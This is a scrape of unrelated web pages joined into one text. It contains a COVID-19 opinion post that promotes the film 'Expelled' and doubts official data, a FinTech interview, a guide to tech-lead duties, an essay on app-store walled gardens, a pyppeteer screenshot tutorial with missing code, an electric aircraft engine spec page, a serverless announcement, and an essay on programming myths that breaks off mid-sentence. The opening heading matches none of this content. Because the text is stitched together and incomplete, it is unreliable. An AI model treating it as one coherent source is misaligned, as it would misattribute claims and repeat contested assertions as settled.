id="what-advice-do-you-have-for-someone-without-a-cs-degree-who-wants-to-get-their-first-programming-job">What advice do you have for someone without a CS degree who wants to get their first programming job? </h2><p>Don’t work hard (too hard), work smart!

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			




<div><p>After review of the article by an academic, I was prompted to thoughtfully change some of the wording from the original conclusions drawn in order to promote better factual accuracy while still expressing the opinions meant to be expressed.</p></div>



<blockquote><p>Where there is no guidance, a people falls, but in an abundance of counselors there is safety.</p><cite>Proverbs 11:14</cite></blockquote>



<p>COVID-19 is a topic that most of us are tired of hearing about. It has taken a tragic death toll, and I am aware of at least three people who lost a loved one from COVID-19. One of them attended my wedding.</p>



<p>While the situation is unarguably serious and even deadly, the information we receive is muddy, at best. In fact, there is now <a href="https://m.metrotimes.com/news-hits/archives/2020/05/26/michigan-artificially-inflated-its-coronavirus-testing-numbers?fbclid=IwAR1k_cvmmnwbuu_qclHV95L4vnZ6n4PRetErrpL75FzBhHjMGP7SndhOXW0">a report of artificially inflated numbers</a> in at least one state.</p>



<p>I am <strong><em>not</em></strong> saying that the death told estimates we are being told is wrong. I am <strong><em>not</em></strong> saying that we should exercise the precautions that the WHO and CDC have given us. However, I am saying that the transparency in data collection and interpretation seems to be lacking.</p>



<p>What is also lacking is the public promotion of peer-reviewed data models of the sociological consequences of a battered economy, including the number of deaths caused by poverty. It may be out there, but if it is, then it hasn’t been given the same spotlight.</p>



<p>Something is terribly wrong when we ignore the opposing viewpoint of a scientific observation out of hand. Unfortunately, academia appears to be beyond ripe for this type of behavior, as observed in Ben Stein’s documentary <em>Expelled</em>.</p>



<p>If you haven’t seen it, I highly recommend watching the testimonials of a host of qualified scientists who were removed from their academic positions for suggesting the possibility of the world coming from a source of intelligent design. These people didn’t necessarily mention God, mind you. Just academically countering a theory, like all good scientists should. </p>



<p>Countering a hypothesis or theory to test its validity is called “doing your homework”.</p>



<p>Ben Stein’s tongue-in-cheek humor will keep you from falling asleep hearing people talk science…until he establishes the (indirect) link between Nazism and suppression of academic thought, with the common denominator being Darwinism. Then the documentary takes a serious turn. Real serious.</p>



<figure><p>
<iframe title="Expelled: No Intelligence Allowed New Trailer" width="580" height="435" src="https://www.youtube.com/embed/z-L4zp7zGfg?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>



<h4>What’s this got to do with COVID-19? Hang on, I’m getting there…</h4>



<p>A Nobel laureate has stepped forward to say that questioning the current narrative has become politicized and that definitive sourcing has been assigned to an elite few rather than to a highly-qualified international group of professionals.</p>



<p>Skip ahead to 10:56 <a href="https://www.mediatheque.lindau-nobel.org/videos/38691/corona-the-role-of-science-in-times-of-crisis" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener">in this video debate</a> to see the major claims by <a aria-label="undefined (opens in a new tab)" href="https://twitter.com/MLevitt_NP2013" target="_blank" rel="noreferrer noopener">Nobel Laureate Michael Levitt</a>.</p>



<p>Levitt is not saying that his observations are absolutely right, mind you, but he is saying that he has made a scientific observation, is standing by the data he has compiled, and is welcoming peer review to challenge the data. Instead of academic review, he has been met with verbal abuse. It would seem that censorship of an opposing scientific observation is alive and well over a decade after <em>Expelled</em> was released.</p>



<p>In other words, I don’t believe we truly did all our homework. Just part of it.</p>



<p>While Dr. Fauci did his best within the scope of his expertise, I don’t believe that he has been able to consult high-caliber professionals outside the scope of his expertise. We may be reacting to observations and a data collection effort that has been unprecedented, but with the missing piece of academically reviewing the antitheses challenging the current narrative, I don’t believe we’re actually doing science. We’re answering a pandemic with too much politics instead. On both sides.</p>



<p>The Scientific Method is missing from the process.</p>



<p>Until we have better peer review of the data compiled from multiple qualified sources, there is a possibility that the margin of error reported in the news is astronomically big, or that it is very small, and because of the lack of sufficient academic oversight there’s no way to know either way.</p>



<p>Until we know for certain how close or how far off we were on the numbers, or until the pandemic sufficiently goes away, I still believe COVID-19 is serious. I’ll still wear a mask where I’m asked to and where I believe it to be prudent. Same with keeping my distance from the sick and the vulnerable. Not because I’m afraid, but because of my worldview as a believer in Jesus. In that worldview, I believe in valuing life over death (Proverbs 8:36), loving our neighbor (Matthew 22:39), obeying our authorities (Romans 13:1), and pursuing peace where possible (Hebrews 12:14). </p>



<p>A little mask over my face is very small inconvenience compared to the hardships our forerunners had to face in order to preserve life and liberty.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <p><strong>Can you summarise your experience in the FinTech and RegTech sectors?</strong></p><p>I spent most of my life doing I.T and enterprise software development. I exited my last company in 2007, which I’d founded. For the last ten years, I’ve been focussing on corporate governance. I've been working with boards of directors of all sorts of companies, in all sorts of sectors. Looking particularly at governance in the FinTech, RegTech, Banking and Financial Services sectors.&nbsp;</p><p><strong>What do you think are the biggest unsolved problems and issues in the FinTech sector?</strong></p><p>There’s a lot of talk about Artificial Intelligence. Most applications at the moment are just scratching the surface of AI. So, I think there’s a lot of companies out there looking for people who are AI experts. And a lot of the work they’re doing is quite low level. The opportunity for people in AI is fintech startups. The smaller, more agile companies who can harness that stuff much better than the larger organisations.&nbsp;</p><p>Obviously, things like blockchain, to make things more secure. There’s the whole area of cybersecurity and how you protect these things, especially if they’re going to move into mobile devices, wearables and all the other ways in which we’re going to start accessing financial information. Cyber-security becomes a much bigger deal, as people have found out just with Bank employees working from home. The security implications are massive.&nbsp;</p><p>I think there is an added focus on customer experience. So UI design, how customers will access information from various devices, how we’re going to monitor transactions and make life easier for customers. Banks have had it far too easy. The Challenger banks are offering a much better customer experience.&nbsp;</p><p><strong>What has taken you by surprise about the way the sector has developed over the last ten years?</strong></p><p>Only that it’s taken them so long! The technology has been around forever. If you look at social media platforms – Facebook, Google, Twitter – they’re all ten years old, if not more. So the technology has been around for a while. The big surprise for me is that it has taken so long for it to hit financial services. They’ve got a lot of catching up to do. One of the areas I didn’t mention before is the use of big data. Imagine if you could see all of the financial transactions going on in the world at one time, which is technically feasible, and you could analyse that, then things like money laundering and financial crime would be quite difficult to hide. You’d be able to spot the unusual transactions.&nbsp;</p><p>Having worked with banks in the past, I know how antiquated their systems are. They’re still working on old legacy systems.&nbsp;</p><p><strong>Do you think a lot of the innovation in future will be happening inside these big banks as they catch up? Or do you think there is still room for startups to change the game?</strong></p><p>I think a lot of the innovation will come from startups, but they will be rapidly bought out by the big organisations, who just haven’t got the resources to do it all themselves. There will be a lot of consolidation once the innovations start.&nbsp;</p><p><strong>Is there anything that current startups in the sector are missing?</strong></p><p>As soon as they start competing with banks, for example, startup banks, they will encounter a lot of competition from the people already entrenched in the system. They either get forced out or they get bought up. I think it’s going to be very difficult, in an end to end service like starting your own challenger bank, to be successful and growing to the same size. It’s the race for getting customers which costs a lot of money. You don’t make any money to start with, because you’re trying to get your customer base up. I think what will be a growth area is the intermediaries, people who handle parts of the system.&nbsp;</p><p><strong>Any thoughts on the RegTech sector?</strong></p><p>RegTech goes hand in hand with FinTech, applying the same sort of technology to the regulations that all the banks and insurance companies have to operate within. Most of the major banks, at least 50% of their technology effort is on trying to comply with regulations. And the regulations just get bigger and bigger. The Anti Money Laundering and Know Your Customer, are big ones. If you’re trying to make it easy for people to set up an account, then you’ve got to do those checks very quickly and easily. Another thing is all of the sanctions, particularly the sanctions America puts on countries all over the place, that you have to comply with. Keeping track of all those regulations is a big area. There’s quite a lot of work going on in RegTech to try and make it easier for Banks to comply with the regulations.&nbsp;</p>

                    <p>There's a lot of ambiguity around tech leading. So, it's crucial to define what it is appropriately — or should be. Tech Leads, Technical Leads, or Tech Leaders are software engineers responsible for developing, maintaining, and promoting a project or product's technical vision.</p>
                    <p>Tech Lead's job is far more extensive then coding. Actually, in practice, Tech Leads spend about 30% of time coding, and 70% doing many other essential tasks. They lead one or more teams to succeed from a technical perspective.</p>
                    <p>Therefore, people that care for other aspects of the product are vital allies for Tech Leads. The other way around is also real. Project Managers, Product Managers, Engineering Managers need someone to ensure the project or product meets the functional and non-functional requirements with quality and velocity.</p>
                    <p>However, depending on the company, responsibilities and job descriptions may vary.</p>
                </div>
                <div>
                    <p>Depending on the team's seniority, it requires more attention, more presence in meetings, or more frequent feedback loops. If the company is a startup, there may be very few documented or agreed standards, which requires Tech Leads to spend more time on it then coding or mentoring new members.</p>
                    <p>As it sounds, a tech leader's job is much more about orienting individuals and delivering <a href="https://sourcelevel.io/how-tech-leads-and-team-leads-can-measure-teams-productivity">high-quality code</a> than implementing the software itself. It makes your assignment more intangible, and the impact of your decisions need more time to bring value.</p>
                    <p>Software Engineers can implement a new feature and deploy it to production in one to two weeks. On the other hand, Tech Leads can take months to establish, advocate, and prioritize an architectural solution with the team. The job starts with an idea and goes through a complicated process to get quality code running in the product.</p>

                    <p>As already stated, the responsibilities and expectations vary depending on many aspects. Companies that develop Digital Products need Tech Leads to grant success in the medium and long run.</p>
                    <p>On the other hand, consulting firms and software houses need Tech Leads to drive projects, so they don't fail on delivery. In both cases, Tech Leaders must translate business requirements into technical requirements.</p>
                    <p>From the programming language to architecting the whole system, it's Tech Lead's job to drive the team to success.</p>

                    <h3>Tech Lead's Responsibilities</h3>
                    <p>The following list summarizes everyday responsibilities found in job listings pages. The relevant items in job descriptions usually include:</p>

                        <li>👉 Coordinate and motivate the team members.</li>
                        <li>👉 Take up the technical responsibility of the entire Project or Product. However, more prominent companies group software engineers around parts of the system, and each Tech Lead usually leads one to three teams.</li>
                        <li>👉 Design components and applications according to business requirements. At corporations that miss a Software Architect, Tech Leads may be responsible for designing the whole system.</li>
                        <li>👉 Define, advocate, and implement best practices and coding standards of the team.</li>
                        <li>👉 Work along with other Tech Leads, Product Managers, and Engineering Managers.</li>
                    </ul>
                </div>
                <div>
                    <ul>
                        <li>👉 Promote a collaborative work environment, and keep on asking for <a href="https://sourcelevel.io/everything-about-code-review-from-peer-review-to-automated-code-review">code review</a> and the feedback from the peers.</li>
                        <li>👉 Generate detailed reports with accomplished, planned, and blocked tasks. Some companies may require a simple operational plan to remove impediments.</li>
                        <li>👉 Enable teams to perform tests and integration tests for the entire system in a reliable, secure, and productive way.</li>
                        <li>👉 Identify and mitigate risks, including security risks.</li>
                        <li>👉 Write postmortems for critical bugs, or outage episodes.</li>
                        <li>👉 Work on continually increasing the productivity of the team and reducing the waste on the other end.</li>
                        <li>👉 Always motivate and encourage the team to give their best, especially when they are under pressure.</li>
                        <li>👉 Make yourself completely aware of all the technologies thoroughly, especially those associated with software or application under construction.</li>
                        <li>👉 Actively promote a <a href="https://sourcelevel.io/blog/code-review-a-practice-that-depends-on-the-culture">Code Review culture</a> and review the team's <a href="https://sourcelevel.io/pull-requests-checklists-metrics-and-best-practices-a-definitive-guide">Pull Requests</a>.</li>
                        <li>👉 Share the success and failures with the team.</li>

                    <p>Eryn O'Neil, in her talk,&nbsp;<a href="https://www.youtube.com/watch?v=FcyD85z3JSI">Congrats! You're the tech lead - now what?</a>, organized the practical job of a Tech Lead in three main goals: facilitate, advocate, and motivate.</p>
                    <p>Facilitate is the act of assisting the teams in delivering high-quality software. During the development process, many questions, blocks, and problems arise, and it's a Tech Lead job to guide the team back to safety.</p>
                    <p>It doesn't mean they need to know everything or solve all the issues by themselves. They can and should work together with the team to find great solutions.</p>
                    <p>Advocating is crucial to a Tech Lead. Whether extroverted or not, these professionals should promote discussions and actively participate in meetings.</p>
                    <p>Another essential job is to put everyone on the same page after a new technical decision. The same happens when the product team puts pressure on the engineering team to deliver a new feature as fast as possible.</p>
                </div>
                <div>
                    <p>As a guardian of the best practices and the codebase health, dealing with technical debt is one of the most common tasks of a Technical Leader. Therefore, they also must be involved in the prioritizing process, to endorse the "no" for new features and bring to the top of the list relevant technical debts and refactoring needed.</p>
                    <p>The best way to motivate the team is by empowering them to do the best work possible. It is especially hard when the culture bases on "command and control." This kind of culture also centralizes decisions in Tech Leads, which leads to burnouts and lousy performance.</p>
                    <p>The best way to empower people is to give them freedom and space for innovation while pointing out the pros and cons of proposed solutions. It educates and also helps in sharing ownership of the goals and objectives.</p>
                    <p>Playing this role doesn't mean that they became bosses or the most important person among team members. However, people expect a Tech Lead to take accountability for the team's result, and because of that, they should have leadership skills.</p>

                    <p>The role of Tech Lead is sometimes kind of fuzzy. The technical aspects of software development depend on Software Engineers too. Frequently, it's common to see Senior Software Engineers perform tasks usually attributed to tech leads.</p>
                    <p>The Tech Lead's job, however, is more complicated. It's a full-time job that requires more soft skills than developers usually desire to exert.</p>

                    <p>It's the first goal of a Tech Lead. With a defined technical vision, the team has a horizon, and they will know what to do. With a plan in hand, tech leads can now concentrate on other crucial tasks, like communicating, monitoring progress, and guiding the team.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>One of the basic concepts of capitalism is the idea that competition is good for consumers. I think in most cases this is true. One famous example is the <a href="https://en.wikipedia.org/wiki/History_of_General_Motors">history of General Motors</a>, a company that became so powerful and dominant that the US government considered breaking GM into separate companies.</p><p>GM was never broken up, and in the end their dominance waned. Now <a href="https://en.wikipedia.org/wiki/List_of_manufacturers_by_motor_vehicle_production#2017">GM ranks 4th globally</a> in terms of number of vehicles sold, so they hardly went away, but they don’t control anywhere close to the majority of the market.</p><p>How did this happen? There are differing theories: failure to innovate, poor execution, bad strategy. Another, more likely explanation is that Asian manufacturers (Toyota, Hyundai, Honda, Nissan) started producing higher quality, less expensive automobiles than GM, and GM failed to adapt. These competitors chipped away at GM’s dominance.</p><p>In any case, the end result was a win for consumers: more options, higher quality, and lower costs.</p><h2 id="platforms">Platforms</h2><p>Today our digital lives are largely dominated by 2 companies, Apple and Google. They are the only relevant mobile platform vendors, and they both operate walled gardens for their devices. As consumers we have little choice outside of this duopoly.</p><p>In order to publish on Apple or Google’s platform (via their respective app stores), you must first get permission to operate from those companies.</p><p>In other words, if I buy an iPhone, it is Apple who decides what software I can run on my phone. As a publisher, I can’t publish software unless it earns the Apple or Google seal of approval.</p><p>In a sense, we don’t <em>really</em> own the hardware we’re buying.</p><p>To use an analogy, imagine if you bought a Prius and you were only allowed to drive to Toyota approved destinations on Toyota approved roads.</p><h2 id="at-war">At War</h2><p>Apple recently announced it would warn users about apps were tracking users, and provided them a prompt to <em>ask</em> the app not to track them. Some might interpret this as a shot across the bow at ad companies like Google and Facebook who’s main business proposition is the idea that they have high quality targeting data based on behavioural tracking and surveillance.</p><p>Sounds like a win for users, right? Not so fast.</p><p>Amusingly, Apple simultaneously offered their own tool for tracking that would <em>not</em> trigger the warning, <a href="https://uk.reuters.com/article/uk-google-apple/google-backed-groups-criticize-apples-new-warnings-on-user-tracking-idUKKBN2440VG">as per a Reuters article</a>. One could interpret this as a prelude to Apple’s intention to enter the advertising market alongside Google and Facebook. So while it appears on the outside to be a good thing, it’s actually just another attempt by Apple to gain market share.</p><h2 id="the-end-of-the-web">The end of the web</h2><p>Another trend happening simultaneously is the move from open web platforms to app-based walled gardens. You can see this manifested directly in the attempts of major platforms to disable sharing of files and URLs.</p><p>For example, if I share a link on Twitter, it will replace that link with Twitter’s own tracking URL that requires redirection through Twitter’s platform. The same is true for videos (and all files for that matter): you can’t simply attach a file to a tweet and share it. There are ways to download videos from Twitter, but Twitter makes it as hard as possible for you to do that.</p><h2 id="whos-winning">Who’s winning?</h2><p>Without question the biggest winners are the platforms. They’re optimized for stickiness, and the effect has been unquestionably powerful. It’s like going to the grocery store and being allowed to buy as much ice cream as you want, but there are only two flavours available: chocolate or vanilla. All other flavours are bad.</p><figure><img src="https://brndn.io/blog/2020/07/03/platform-wars/are-ya-winning-son_hu5215f8fd9bee4602b34ed414a45f6ba1_69712_1100x1100_fit_q95_lanczos.jpg" width="350"><figcaption><small><em>Winning</em></small></figcaption></figure><p>Unlike the automobile industry, the software world exhibits strong network effects, especially since nearly every platform is some kind of social network.</p><p>Users lose out (or as I like to say, users get used), small publishers lose out, and the amount of diversity of thought and ideas becomes narrow and</p><h2 id="in-the-digital-age-does-ownership-exist">In the digital age, does ownership exist?</h2><p>As I mentioned before, when you buy an iPhone you don’t <em>really</em> own the hardware, since you don’t get to decide what software you run.</p><p>Another example of this effect are DRM-encumbered digital books: you can’t lend them out, and you can sell them to anyone.</p><p>There’s a case in front of the courts right now which <a href="https://www.eff.org/press/releases/eff-and-durie-tangri-join-forces-defend-internet-archives-digital-library">the EFF has promised to help with</a> in attempt to protect our right to lend books, digital or otherwise. It’ll be interesting to watch and see where things go.</p><hr></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="mainContentOfPage">
		
<p><a href="https://pypi.org/project/pyppeteer/">pyppeteer</a> is a Python port of a headless Chromium browser automation library <a href="https://github.com/puppeteer/puppeteer">puppeteer</a>. It is a very useful tool in general and can be used to perform a number of tasks like web scraping, automation and making website screenshots! The advantage of using an actual browser to create website screenshots is clear: it gives us the very same result people will see in their own browsers.</p>



<p>Once the screenshot is taken, we will use Python imagining library <a href="https://pillow.readthedocs.io/en/stable/">Pillow</a> to resize the resulting image to the size we want. We can call our code in number of ways, but for this example I will use CLI library <a href="https://click.palletsprojects.com/en/7.x/">Click</a>. You can learn more about Click in my other blog post <a href="https://stribny.name/blog/2020/01/building-command-line-interfaces-in-python">Building command-line interfaces in Python</a>.</p>



<p>So let’s begin by installing our dependencies:</p>



<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f0235443cbbf690681119" data-settings=" no-popup minimize scroll-mouseover">
		
			
			<div>
				<table>
					<tbody><tr>
				<td data-settings="hide">
					
				</td>
						<td><div><p>pip install pyppeteer</p><p>pip install pillow</p><p>pip install click</p></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->




<p>Pyppeteer will also need a working copy of Chromium, which can be downloaded directly by invoking <code>pyppeteer-install</code> command which will become available after installation.</p>



<p>Once this is done, we can start creating our program. The main code will  start a headless Chromium, navigate to a page we want to capture and save its screenshot to a file of our choosing. The interesting thing is that pyppeteer has asynchronous API, so we will define our function also as asynchronous and later on use Python’s AsyncIO event loop to run it:</p>



<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f0235443cbc6938252565" data-settings=" no-popup minimize scroll-mouseover">
		
			
			<div>
				<table>
					<tbody><tr>
				<td data-settings="hide">
					
				</td>
						<td><div><p><span>async </span><span>def </span><span>capture_screenshot</span><span>(</span><span>url</span><span>:</span><span> </span><span>str</span><span>,</span><span> </span><span>path</span><span>:</span><span> </span><span>Path</span><span>,</span><span> </span><span>viewport_width</span><span>:</span><span> </span><span>int</span><span>,</span><span> </span><span>viewport_height</span><span>:</span><span> </span><span>int</span><span>)</span><span> </span><span>-&gt;</span><span> </span><span>None</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp; </span><span>browser</span><span> </span><span>=</span><span> </span><span>await </span><span>launch</span><span>(</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp; </span><span>page</span><span> </span><span>=</span><span> </span><span>await </span><span>browser</span><span>.</span><span>newPage</span><span>(</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp; </span><span>await </span><span>page</span><span>.</span><span>setViewport</span><span>(</span><span>{</span><span>'width'</span><span>:</span><span> </span><span>viewport_width</span><span>,</span><span> </span><span>'height'</span><span>:</span><span> </span><span>viewport_height</span><span>}</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp; </span><span>await </span><span>page</span><span>.</span><span>goto</span><span>(</span><span>url</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp; </span><span>await </span><span>page</span><span>.</span><span>screenshot</span><span>(</span><span>{</span><span>'path'</span><span>:</span><span> </span><span>path</span><span>}</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp; </span><span>await </span><span>browser</span><span>.</span><span>close</span><span>(</span><span>)</span></p></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0008 seconds] -->




<p>The code is very straightforward due to the pyppeteer’s simple API. The important decision here is that we want to be able to provide browser’s viewport dimensions. Unless set to a proper screen size, Chromium would start with a very small window and the screenshot would be useless.</p>



<p>After the screenshot is saved, we want to resize it to a size for publishing, so for that let’s implement a resize_screenshot function:</p>



<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f0235443cbc9516466695" data-settings=" no-popup minimize scroll-mouseover">
		
			
			<div>
				<table>
					<tbody><tr>
				<td data-settings="hide">
					
				</td>
						<td><div><p><span>def </span><span>resize_screenshot</span><span>(</span><span>original_path</span><span>:</span><span> </span><span>Path</span><span>,</span><span> </span><span>resized_path</span><span>:</span><span> </span><span>Path</span><span>,</span><span> </span><span>width</span><span>:</span><span> </span><span>int</span><span>,</span><span> </span><span>height</span><span>:</span><span> </span><span>int</span><span>)</span><span> </span><span>-&gt;</span><span> </span><span>None</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp; </span><span>im</span><span> </span><span>=</span><span> </span><span>Image</span><span>.</span><span>open</span><span>(</span><span>original_path</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp; </span><span>im</span><span>.</span><span>thumbnail</span><span>(</span><span>(</span><span>width</span><span>,</span><span> </span><span>height</span><span>)</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp; </span><span>im</span><span>.</span><span>save</span><span>(</span><span>resized_path</span><span>)</span></p></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->




<p>To tie it all together, we will use Click to implement a command. This command will allow us to change all of the parameters we need: the URL, viewport size, final screenshot size and the filenames used for saving the images:</p>

<!-- [Format Time: 0.0008 seconds] -->




<p>As our capture_screenshot function is async, we had to create AsyncIO event loop to invoke it. You can see the whole working example including the imports in my <a href="https://github.com/stribny/python-screenshots/blob/master/main.py">python-screenshots</a> repository.</p>



<p>To run the program, simply invoke our screenshot command:</p>



<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f0235443cbcc859723348" data-settings=" no-popup minimize scroll-mouseover">

					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0000 seconds] -->




<p>And this is all! By default, screenshot.png and screenshot_resized.png files will be saved in the project directory for further processing.</p>

        <div itemprop="text">
<p><span><strong><span><span>E-811: The first type-certified electric engine for use on General Aviation aircraft</span></span></strong></span></p>
<p>The E-811 is the first electric engine certified for use in General Aviation by the European Union Aviation Safety Agency (EASA). Enjoy the benefits of a type-certified electric engine or boost the development process of your powered sailplane, UL, LSA, VLA or Part‑23 Level-1 aircraft.</p>
<p>The E-811 engine combines a liquid-cooled electric motor and a liquid-cooled power controller. Offering 57.6 kW (77 hp) of peak power, and 49.2 kW (66 hp) of maximum continuous power, the E-811 is the ideal powerplant for powered sailplanes, UL, LSA and VLA aircraft, where a Type Certified Engine is required. It may also be installed on Part-23 Level 1 aircraft and other distributed propulsion applications by applying the corresponding special conditions.</p>
<p><img src="https://www.pipistrel-aircraft.com/wp-content/uploads/2020/06/268MVLC_top-294x300.png" alt="" width="294" height="300" srcset="https://www.pipistrel-aircraft.com/wp-content/uploads/2020/06/268MVLC_top-294x300.png 294w, https://www.pipistrel-aircraft.com/wp-content/uploads/2020/06/268MVLC_top-768x784.png 768w, https://www.pipistrel-aircraft.com/wp-content/uploads/2020/06/268MVLC_top-36x36.png 36w, https://www.pipistrel-aircraft.com/wp-content/uploads/2020/06/268MVLC_top-691x705.png 691w, https://www.pipistrel-aircraft.com/wp-content/uploads/2020/06/268MVLC_top-450x459.png 450w, https://www.pipistrel-aircraft.com/wp-content/uploads/2020/06/268MVLC_top.png 919w" sizes="(max-width: 294px) 100vw, 294px"></p>
<p>The propulsion motor is a state-of-the-art axial flux synchronous permanent magnet electric motor. Lighter and more compact, these motors are also more powerful than radial flux motors, making them ideal for their application in aviation. The propeller is mounted directly on its rotor.</p>
<p>The associated controller converts direct current (DC) from the batteries to alternating current (AC) for the motor. The controller receives torque command via CAN bus and adjusts the motor current input accordingly through the engine’s high voltage AC bus. The motor reacts instantaneously and without hesitation. The controller also requires a 12-volts power supply.</p>
<p><img src="https://www.pipistrel-aircraft.com/wp-content/uploads/2020/06/H300C_45-300x226.png" alt="" width="300" height="226" srcset="https://www.pipistrel-aircraft.com/wp-content/uploads/2020/06/H300C_45-300x226.png 300w, https://www.pipistrel-aircraft.com/wp-content/uploads/2020/06/H300C_45-768x579.png 768w, https://www.pipistrel-aircraft.com/wp-content/uploads/2020/06/H300C_45-1030x777.png 1030w, https://www.pipistrel-aircraft.com/wp-content/uploads/2020/06/H300C_45-705x532.png 705w, https://www.pipistrel-aircraft.com/wp-content/uploads/2020/06/H300C_45-450x339.png 450w, https://www.pipistrel-aircraft.com/wp-content/uploads/2020/06/H300C_45.png 1314w" sizes="(max-width: 300px) 100vw, 300px"></p>
<p><strong>Flexibility</strong></p>
<p>The motor’s rotation direction is not factory selected and can be easily adapted to any given application as part of the installation. The motor can turn clockwise or counter-clockwise as the default direction of rotation.</p>
<p>The E-811 supports a wide range of propellers. Fixed, ground-adjustable and electric variable-pitch propellers can be mounted on the engine, as long as they are compatible with the flange geometry and screw pattern (6xM8 on 75 mm diameter). Hydraulic governors are not supported. The propeller should have a maximum moment of inertia of 3245 kg-cm<sup>2</sup> (7.7 lb-ft<sup>2</sup>) and weigh less than 5.5 kg. Maximum engine speed is 2500 rpm. A propeller that meets the E-811 engine technical specifications and limitations is available to order or can be specially designed at Pipistrel.</p>
<p><strong>Cooling system and additional installation equipment</strong></p>
<p>The engine is entirely liquid-cooled through a single cooling circuit with a mixture of 50% water and 50% glycol (automotive grade G12+). The coolant inlet is located on the power controller, it then proceeds to the motor via an intermediate coolant hose. The coolant outlet is located on the motor.</p>
<p>The cooling system is part of the installation and can be provided by Pipistrel. It comprises the following components: a coolant pump; a radiator; an expansion tank; an overflow bottle; inlet, outlet and intermediate hoses; and the coolant itself. The circuit shall ensure a coolant temperature at either component of less than 60°C.</p>
<p>In order to control the engine power output, an auxiliary control system should be provided. This can be ensured either by a power lever or a flight control computer, while cockpit indication such as an RPM indicator shall be provided as well. Different solutions are available to complement your installation, please inquire about different options which Pipistrel can deliver.</p>
<p>The engine requires high-voltage DC power to be supplied for propulsive force. Depending on the chosen architecture, the engine will accept DC power from the energy source, which may be batteries connected via a battery management system (BMS), or a generator, or a fuel cell, or combinations thereof. A low-voltage (12 VDC) power connection is also needed.</p>
<p>Installation of the additional equipment depends on the aircraft configuration. Its suitability for the E-811 engine must be demonstrated within the scope of the type certification of the aircraft.</p>

			<p><strong>Serverless</strong> gives us the power to focus on delivering value to our customers without worrying about the maintenance and operations of the underlying compute resources. Cloud providers (like AWS), also give us a huge number of managed services that we can stitch together to create incredibly powerful, and massively scalable serverless microservices.</p>
<p>Almost 2 years ago now, I wrote a post on <strong><a href="https://www.jeremydaly.com/serverless-microservice-patterns-for-aws/">Serverless Microservice Patterns for AWS</a></strong> that became a popular reference for newbies and serverless veterans alike. The capabilities of serverless have changed dramatically since then, opening up a ton of new patterns and possibilities. Today I’m announcing the <a href="https://www.jeremydaly.com/serverless-reference-architectures/"><strong>Serverless Reference Architectures Project</strong></a>. This project is intended to capture, share, explore, and debate the patterns and practices being used in serverless production applications today.<span id="more-2764"></span></p>
<p>To really understand what’s going on, it’s useful to take a bird’s-eye view of a pattern, understand how data flows back and forth through the different components, and think about the implications on your application. I’ve created interactive architectures that let you explore the details of each component and walk you through the different steps.</p>
<p>You also need to understand how a pattern would come alive with AWS services and how you can configure it for your implementation. I’ve partnered with <strong><a href="https://www.stackery.io/" target="_blank" rel="noopener">Stackery</a></strong> and integrated their interactive canvas so that you can explore these patterns, customize them, and generate updated SAM templates automatically.</p>
<p>Finally, you want to understand how you’d replicate the pattern in production using infrastructure-as-code to ensure repeatable, safe deployments. You’re free to use the generated SAM templates, or take advantage of community supplied templates for the Serverless Framework, CDK, and others.</p>
<p>This project hopes to encapsulate all of this in one place so you can start by learning about the pattern fundamentals, then go all the way through to deploying a functional version of the pattern into your own AWS account (all with just a few clicks).</p>
<p>By partnering on sharing common serverless reference architectures and patterns, we can help others unlock the true power of serverless with AWS. We are starting with just a few patterns, but I plan on adding several more and hope that <a href="https://github.com/jeremydaly/reference-architectures" target="_blank" rel="noopener"><strong>you will contribute</strong></a> as well.</p>
<p><strong><a href="https://www.jeremydaly.com/serverless-reference-architectures/">Give it a try</a>, and let me know what you think!</strong></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>A while ago I was pulled into a discussion about the speed and magic optimizations
of a particular container within the standard library of a coworker’s programming
language of choice. They were claiming how there is a special container
that somehow magically performs better than a normal array when it’s used for
adding a number to every element within that container.</p><p>For some reason in a corporate world you will always find such pieces
of wisdom floating around. The standard library is treated as some kind of a
magic box that performs an order of magnitude better than whatever you could
ever program yourself.</p><p>I don’t believe in witchcraft though. A memory access is a memory access and unless you figure out
a more efficient algorithm for performing your operation, this magic container
is not going to perform any faster. So I convinced this person to write an actual program that will compare their magic
container with an every day array. Lo’ and behold my favorite
optimization technique that could be summed as “when in doubt use a for loop
and iterate over array” proved to be right. The thing compiled into more or
less the same thing, while an array solution performed slightly better on average.</p><p>It just goes to show how the software industry excels at regurgitating myths instead
of sitting down and thinking really hard about the problem at hand. I partially
blame this culture on the pervasive money making industry, which likes to spoon
feed scholars with random bits of trivia instead of actually making them think.
You also know it under the name of higher education.</p><p>When you know nothing at all, being spoon fed the knowledge is a great way to become
aware of the vast field around you. As soon as you gather enough knowledge to be dangerous,
you start to realize how Gell-Mann amnesia effect is a real thing and most
of the world is broken [1].</p><p>Since young people are being spoon fed knowledge for a tremendously large chunk of their life,
